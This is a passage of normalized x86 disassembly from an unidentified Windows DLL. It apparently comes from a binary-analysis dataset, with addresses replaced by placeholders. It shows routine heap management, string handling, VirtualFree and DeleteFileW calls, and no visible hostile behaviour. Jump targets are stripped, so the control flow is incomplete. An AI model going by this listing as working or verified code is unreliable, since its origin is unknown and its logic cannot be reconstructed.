lea ecx [ ebp - 0x2c ]
push ecx
lea edx [ ebp - 0x24 ]
push edx
mov [ ebp - 0x14 ] al
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
push ecx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x24 ] ebx
call sub_10026eb0
mov dx [ ebp - 0x18 ]
add esp 0x14
mov [ esi + 0xe ] dx
cmp [ ebp + 0xc ] bl
je r-xdata
mov edx [ ebp - 0x18 ]
mov al [ edx ]
mov [ ecx ] al
dec edi
inc ecx
inc edx
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_10059d69
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x24 ]
push ecx
mov [ ebp - 0x28 ] edx
push 0x1
lea edx [ ebp + 0xc ]
push edx
lea eax [ ebp - 0x18 ]
push eax
mov [ ebp + 0xc ] 0x2e
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x24 ] ebx
call sub_10026eb0
mov cx [ ebp - 0x18 ]
add esp 0x14
mov [ esi + 0xc ] cx
call sub_10059d69
mov [ ebp - 0x28 ] edx
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x1
lea ecx [ ebp + 0xc ]
push ecx
lea edx [ ebp - 0x18 ]
push edx
mov [ ebp + 0xc ] 0x2c
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x24 ] ebx
call sub_10026eb0
mov ax [ ebp - 0x18 ]
add esp 0x14
mov [ esi + 0xe ] ax
cmp edi ebx
jbe r-xdata
sub_10053c0a
mov edi edi
push edi
push rw-data
mov edi ecx
call [ InterlockedIncrement@IAT ]
test eax eax
jne r-xdata
mov eax edi
pop edi
retn
push esi
mov esi rw-data
push esi
call sub_1002ad20
add esi 0x18
pop ecx
cmp esi rw-data
jl r-xdata
pop esi
sub_10053c40
push ebp
mov ebp esp
push 0xffffffff
push sub_100867c8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi ]
lea eax [ ebp - 0x58 ]
push eax
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x58 ] 0x0
call sub_100708f0
mov [ ebp - 0x60 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x58 ]
push 0x4
push 0x0
mov [ ebp - 0x68 ] ecx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x54 ]
mov eax 0xc4
call sub_10053240
mov ecx [ ebp - 0x58 ]
test ecx ecx
je r-xdata
xor esi esi
mov [ eax ] 0x0
mov esi eax
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x60 ]
mov [ esi ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
jmp r-xdata
mov ecx [ ebp - 0x58 ]
mov eax [ edi + 0x4 ]
dec [ eax ]
cmp [ eax ] 0x0
jne r-xdata
inc [ esi ]
mov [ ebp - 0x64 ] esi
lea edx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x0
cmp edi edx
je r-xdata
mov esi [ ebp - 0x5c ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x58 ]
mov [ edi ] ecx
mov [ edi + 0x4 ] esi
inc [ esi ]
jmp r-xdata
mov ecx [ edi ]
test ecx ecx
je r-xdata
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ ebp - 0x4 ] 0xffffffff
dec [ esi ]
jne r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10053d90
push ebp
mov ebp esp
push 0xffffffff
push sub_10086d18
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_10034e98
mov [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx [ rw-data ]
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov edi [ ebp + 0x8 ]
mov esi [ rw-data ]
mov eax [ edi ]
cmp esi [ eax + 0xc ]
jae r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + esi * 4 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi ecx
call sub_1001706d
cmp esi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10069747
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + esi * 4 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_1000fc20
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp + 0x8 ]
mov [ rw-data ] esi
call sub_10034e98
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
call sub_1002c57b
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
call sub_10024fe9
lea ecx [ ebp + 0x8 ]
call sub_10069747
push esi
call sub_10062b65
add esp 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_10053eca
push 0x28
mov eax sub_1008552b
call sub_100624bc
and [ ebp - 0x10 ] 0x0
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_10013ab8
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x34
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
and [ esi + 0x4 ] 0x0
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
push ecx
mov [ esi + 0x28 ] cl
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
call sub_10003a38
mov [ esi ] r--data
jmp r-xdata
sub_10053f70
push esi
mov esi ecx
mov eax [ esi + 0x98 ]
test eax eax
je r-xdata
pop esi
retn
mov ecx [ esi + 0x9c ]
push 0x8000
push ecx
push eax
call [ VirtualFree@IAT ]
mov [ esi + 0x98 ] 0x0
mov [ esi + 0x9c ] 0x0
sub_10053fa6
push 0x20
mov eax sub_10085ac0
call sub_1003fae8
mov eax [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x24 ]
mov ebx [ ebp + 0x28 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_10048c94
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
or [ esi ] 0x1
push 0xffffffff
push 0x0
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_100404a0
or [ esi ] 0x2
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ edi + 0x4 ] eax
call sub_10063060
mov eax edi
call sub_1004642f
retn 0x24
sub_10054047
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
push 0x16
pop eax
pop ebp
retn
sub_10054074
push 0x8
mov eax sub_10085ed2
call sub_100624bc
xor ebx ebx
push ebx
push ebx
mov [ ebp - 0x10 ] ebx
call sub_10045fcf
mov edi [ ebp + 0x14 ]
xor edx edx
pop ecx
inc edx
pop ecx
mov ecx eax
shl edx cl
sar edx 0x1
test [ ebp + 0xc ] edx
je r-xdata
test [ ebp + 0xc ] 0x20
je r-xdata
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0xc ]
and eax 0x4
mov [ ebp - 0x10 ] eax
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_100389e0
push edi
mov esi eax
call sub_10062900
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_100389e0
push edi
mov esi eax
call sub_10038442
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x8
call sub_1001f84c
pop ecx
cmp eax ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_100554b0
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov edi r--data
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_100389e0
push edi
mov esi eax
call sub_1001943c
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ eax + 0x4 ] ebx
mov [ eax ] r--data
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
mov edi [ ebp + 0xc ]
and edi 0x10
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_100389e0
push edi
mov esi eax
call sub_100591c1
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_10059d69
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
cmp edi ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_100389e0
push [ ebp + 0x14 ]
mov esi eax
call sub_1004f4bb
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x34
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_10059d69
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
call sub_10013ab8
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_100389e0
push [ ebp + 0x14 ]
mov esi eax
call sub_10003b92
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x1c
call sub_1001f84c
pop ecx
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x12
cmp eax ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x8
mov [ esi ] edi
mov [ esi + 0x28 ] bl
call sub_10069606
mov [ esi ] r--data
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push [ ebp + 0x14 ]
mov esi eax
call sub_10014237
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x14
call sub_1001f84c
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push ebx
push [ ebp + 0x8 ]
mov ecx eax
call sub_1005bb1c
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push [ ebp + 0x14 ]
mov esi eax
call sub_10026251
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x34
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0xd
cmp esi ebx
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
xor esi esi
push [ ebp + 0x8 ]
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
mov ecx esi
mov [ esi + 0x8 ] ebx
call sub_10040209
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0xe
mov [ esi ] edi
mov [ esi + 0x28 ] 0x1
call sub_10069606
mov [ esi ] r--data
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
sub_10054430
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x10 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x10 ]
mov [ edx + eax - 0x10 ] r--data
push eax
mov [ eax ] r--data
call sub_1005fbb8
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_10054490
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ ecx ]
mov eax [ eax + 0x1c ]
push edx
mov edx [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x10 ]
push edx
push esi
call eax
mov eax esi
mov esp ebp
pop ebp
retn 0x10
sub_100544c0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1008a53f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3f0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x3e8 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x400 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
xor edi edi
mov [ esp + 0x14 ] ebx
cmp [ ebx + 0x8 ] edi
jne r-xdata
mov [ esp + 0x1c ] edi
mov [ esp + 0x20 ] edi
mov [ esp + 0x24 ] edi
mov [ esp + 0x408 ] edi
lea eax [ esp + 0xc8 ]
mov ecx ebx
lea esi [ esp + 0x34 ]
mov [ esp + 0x18 ] edi
mov [ esp + 0x2c ] edi
mov [ esp + 0xc8 ] edi
mov [ esp + 0xcc ] edi
mov [ esp + 0xd0 ] edi
call sub_10014730
mov [ esp + 0x408 ] 0x1
mov esi [ esp + 0xc8 ]
cmp esi edi
je r-xdata
lea eax [ edi + 0x1 ]
jmp r-xdata
lea edx [ esp + 0x19c ]
mov eax 0x59
call sub_10045930
mov eax edx
push eax
lea ecx [ esp + 0x94 ]
add ebx 0xc
push ecx
call sub_10017cc0
add esp 0x8
mov edx eax
mov ecx 0x9
mov [ esp + 0x408 ] 0x2
call sub_100205a0
mov [ esp + 0x408 ] 0x1
cmp [ esp + 0xa4 ] 0x8
jb r-xdata
mov eax [ esp + 0x14 ]
mov edx [ esp + 0xcc ]
push eax
lea ecx [ esp + 0xd8 ]
push ecx
push edx
push esi
call sub_10069cd0
push esi
call sub_100187af
add esp 0x14
mov ecx [ esp + 0x400 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x3e8 ]
xor ecx esp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ esp + 0x14 ]
lea eax [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x38 ]
push ecx
lea ecx [ esp + 0x34 ]
lea edi [ esp + 0x24 ]
call sub_10046560
test eax eax
je r-xdata
mov edx [ esp + 0x90 ]
push edx
call sub_100187af
add esp 0x4
mov eax [ esp + 0x2c ]
cmp eax 0x1e84800
jge r-xdata
lea edx [ esp + 0xf4 ]
mov eax 0x137
call sub_10045930
push edx
lea eax [ esp + 0x94 ]
push eax
call sub_10017cc0
add esp 0x8
mov edx eax
mov ecx 0x9
mov [ esp + 0x408 ] 0x3
call sub_100205a0
cmp [ esp + 0xa4 ] 0x8
jb r-xdata
lea edx [ esp + 0x30 ]
mov eax 0x46
call sub_10045930
mov ecx edx
push ecx
mov ecx [ rw-data ]
push edx
mov eax edx
push eax
push 0x1
push 0x1
push ecx
lea eax [ esp + 0x204 ]
mov [ esp + 0x2c ] 0x1
call sub_10066ff0
test eax eax
jne r-xdata
mov edx [ esp + 0x18 ]
push 0x0
push eax
mov eax [ rw-data ]
push edx
push eax
xor edx edx
xor ecx ecx
call sub_1005c3d0
test eax eax
je r-xdata
lea eax [ esp + 0x34 ]
mov [ esp + 0x408 ] 0x0
call sub_1001f5f0
mov esi [ esp + 0x1c ]
test esi esi
je r-xdata
mov ecx [ esp + 0x90 ]
push ecx
call sub_100187af
add esp 0x4
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x18 ]
push edx
push eax
lea eax [ esp + 0x1f4 ]
call sub_10005c30
add esp 0x8
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
lea edx [ esp + 0xf4 ]
mov eax 0x9
call sub_10045930
mov ecx edx
push ecx
lea edx [ esp + 0xb0 ]
push edx
call sub_10017cc0
add esp 0x8
mov edx eax
mov ecx 0x9
mov [ esp + 0x408 ] 0x4
call sub_100205a0
lea ecx [ esp + 0xac ]
call sub_10019100
lea eax [ esp + 0x34 ]
mov [ esp + 0x408 ] 0x0
call sub_1001f5f0
lea esi [ esp + 0x1c ]
call sub_1006a530
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov edi [ esp + 0x20 ]
mov eax esi
call sub_100699f0
push esi
call sub_100187af
add esp 0x4
mov esi [ esp + 0x1c ]
mov edi [ esp + 0x20 ]
cmp esi edi
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edi [ esp + 0x1c ]
mov esi [ esp + 0x20 ]
cmp edi esi
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov esi [ esp + 0x14 ]
test esi esi
je r-xdata
mov edi edi
lea edx [ esp + 0xc8 ]
mov eax 0x3b
call sub_10045930
mov ecx edx
push ecx
lea edx [ esp + 0x94 ]
push edx
call sub_10017cc0
add esp 0x8
mov edx eax
mov ecx 0x9
mov [ esp + 0x408 ] 0x5
call sub_100205a0
cmp [ esp + 0xa4 ] 0x8
jb r-xdata
jmp r-xdata
lea eax [ esp + 0x1ec ]
push eax
call sub_1004cc40
mov esi eax
test esi esi
je r-xdata
lea edx [ esp + 0xf4 ]
mov eax 0x9
call sub_10045930
push esi
lea esi [ esp + 0xb0 ]
call sub_10045cc0
add esp 0x4
mov esi eax
lea edx [ esp + 0xf4 ]
push edx
lea eax [ esp + 0x94 ]
push eax
mov [ esp + 0x410 ] 0x6
call sub_10017cc0
add esp 0x8
mov ecx eax
mov eax esi
lea edi [ esp + 0xc8 ]
mov [ esp + 0x408 ] 0x7
call sub_10057920
mov ebx 0x8
mov edx eax
lea ecx [ ebx + 0x1 ]
mov [ esp + 0x408 ] bl
call sub_100205a0
cmp [ esp + 0xdc ] ebx
jb r-xdata
mov ecx [ esi + 0x1c ]
push ecx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
add esi 0x24
cmp esi edi
jne r-xdata
lea eax [ esp + 0x34 ]
mov [ esp + 0x408 ] 0x0
call sub_1001f5f0
mov ebx [ esp + 0x1c ]
test ebx ebx
je r-xdata
mov eax [ esp + 0x90 ]
push eax
call sub_100187af
add esp 0x4
jmp r-xdata
mov eax [ edi + 0x1c ]
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
add edi 0x24
cmp edi esi
jne r-xdata
lea eax [ esp + 0x1ec ]
push eax
call [ DeleteFileW@IAT ]
lea edx [ esp + 0x170 ]
mov eax 0x3b
call sub_10045930
mov ecx edx
push ecx
lea edx [ esp + 0xb0 ]
push edx
call sub_10017cc0
add esp 0x8
mov edx eax
mov ecx 0x9
mov [ esp + 0x408 ] 0xc
call sub_100205a0
cmp [ esp + 0xc0 ] 0x8
jb r-xdata
lea ecx [ esp + 0x1ec ]
push ecx
call [ DeleteFileW@IAT ]
lea edx [ esp + 0xf4 ]
mov eax 0x9
call sub_10045930
push esi
lea esi [ esp + 0xb0 ]
call sub_10045cc0
add esp 0x4
mov esi eax
lea edx [ esp + 0xf4 ]
push edx
lea eax [ esp + 0xcc ]
push eax
mov [ esp + 0x410 ] 0x9
call sub_10017cc0
add esp 0x8
mov ecx eax
mov eax esi
lea edi [ esp + 0x90 ]
mov [ esp + 0x408 ] 0xa
call sub_10057920
mov edx eax
mov ecx 0x9
mov [ esp + 0x408 ] 0xb
call sub_100205a0
mov esi 0x8
cmp [ esp + 0xa4 ] esi
jb r-xdata
xor edi edi
xor edx edx
mov esi 0x7
mov [ esp + 0xdc ] esi
mov [ esp + 0xd8 ] edi
mov [ esp + 0xc8 ] dx
cmp [ esp + 0xa4 ] ebx
jb r-xdata
mov ecx [ esp + 0xc8 ]
push ecx
call sub_100187af
add esp 0x4
xor eax eax
mov edi esi
mov eax ebx
call sub_100699f0
push ebx
call sub_100187af
add esp 0x4
mov esi [ esp + 0x20 ]
mov eax [ esp + 0xac ]
push eax
call sub_100187af
add esp 0x4
xor ebx ebx
xor edx edx
mov edi 0x7
mov [ esp + 0xa4 ] edi
mov [ esp + 0xa0 ] ebx
mov [ esp + 0x90 ] dx
cmp [ esp + 0xdc ] esi
jb r-xdata
mov ecx [ esp + 0x90 ]
push ecx
call sub_100187af
add esp 0x4
xor ecx ecx
mov [ esp + 0xa4 ] esi
mov [ esp + 0xa0 ] edi
mov [ esp + 0x90 ] cx
cmp [ esp + 0xc0 ] ebx
jb r-xdata
mov eax [ esp + 0x90 ]
push eax
call sub_100187af
add esp 0x4
xor ecx ecx
mov [ esp + 0xdc ] edi
mov [ esp + 0xd8 ] ebx
mov [ esp + 0xc8 ] cx
cmp [ esp + 0xc0 ] esi
jb r-xdata
mov eax [ esp + 0xc8 ]
push eax
call sub_100187af
add esp 0x4
lea eax [ esp + 0x34 ]
mov [ esp + 0x408 ] 0x0
call sub_1001f5f0
mov esi [ esp + 0x1c ]
cmp esi edi
je r-xdata
mov edx [ esp + 0xac ]
push edx
call sub_100187af
add esp 0x4
lea eax [ esp + 0x34 ]
mov [ esp + 0x408 ] bl
call sub_1001f5f0
mov esi [ esp + 0x1c ]
cmp esi ebx
je r-xdata
mov edx [ esp + 0xac ]
push edx
call sub_100187af
add esp 0x4
mov eax 0x4
jmp r-xdata
mov edi [ esp + 0x20 ]
mov eax esi
call sub_100699f0
push esi
call sub_100187af
add esp 0x4
mov eax 0x5
jmp r-xdata
mov edi [ esp + 0x20 ]
mov eax esi
call sub_100699f0
push esi
call sub_100187af
add esp 0x4
sub_10054ba0
push ebp
mov ebp esp
sub esp 0x8
mov edx [ ebp + 0x8 ]
push ebx
push edi
mov edi [ edx + 0x4 ]
mov eax [ edi + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov cl 0x1
mov [ ebp - 0x8 ] cl
jne r-xdata
mov ebx edi
mov [ ebp - 0x4 ] ebx
test cl cl
je r-xdata
mov ecx [ ebp + 0xc ]
mov ebx [ ecx + 0xc ]
mov eax [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push eax
cmp ecx [ eax + 0xc ]
jae r-xdata
mov eax [ edx + 0x4 ]
cmp edi [ eax ]
jne r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
jmp r-xdata
call sub_100187af
add esp 0x4
pop edi
mov [ esi ] ebx
mov [ esi + 0x4 ] 0x0
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp + 0xc ]
push ecx
mov ecx edi
mov ebx edx
call sub_1005b270
mov edx [ eax ]
pop edi
mov [ esi ] edx
mov [ esi + 0x4 ] 0x1
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x4 ]
call sub_1004c8f0
mov ebx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push ecx
push 0x1
lea eax [ ebp + 0xc ]
push eax
mov ecx edi
mov ebx edx
call sub_1005b270
mov ecx [ eax ]
pop edi
mov [ esi ] ecx
mov [ esi + 0x4 ] 0x1
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp ebx [ eax + 0xc ]
mov edi eax
setb cl
mov [ ebp - 0x8 ] cl
test cl cl
je r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_10054c70
mov [ esi ] r--data
cmp [ esi + 0x84 ] 0x8
jb r-xdata
mov [ esi + 0x84 ] 0x7
mov [ esi + 0x80 ] 0x0
xor ecx ecx
mov [ esi + 0x70 ] cx
mov [ esi ] r--data
cmp [ esi + 0x40 ] 0x8
jb r-xdata
mov eax [ esi + 0x70 ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
mov [ esi + 0x40 ] 0x7
mov [ esi + 0x3c ] 0x0
mov [ esi + 0x2c ] ax
cmp [ esi + 0x20 ] 0x8
jb r-xdata
mov edx [ esi + 0x2c ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
mov [ esi + 0x20 ] 0x7
mov [ esi + 0x1c ] 0x0
mov [ esi + 0xc ] dx
retn
mov ecx [ esi + 0xc ]
push ecx
call sub_100187af
add esp 0x4
sub_10054d00
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov eax edx
push edi
lea edi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
mov ecx esi
call sub_1005ddc0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10054d50
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0x8 ]
mov eax ebx
sub eax esi
sar eax 0x2
cmp eax 0x28
jle r-xdata
mov eax [ esi ]
mov ecx [ edi ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
inc eax
cdq
and edx 0x7
add eax edx
mov edx [ esi ]
sar eax 0x3
lea ecx [ eax * 8 ]
lea ebx [ eax * 4 ]
mov eax [ ebx + esi ]
push edx
push eax
mov [ ebp - 0xc ] ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov eax [ edi ]
mov ecx [ ebx ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ edi ]
mov [ edi ] edx
mov [ esi ] eax
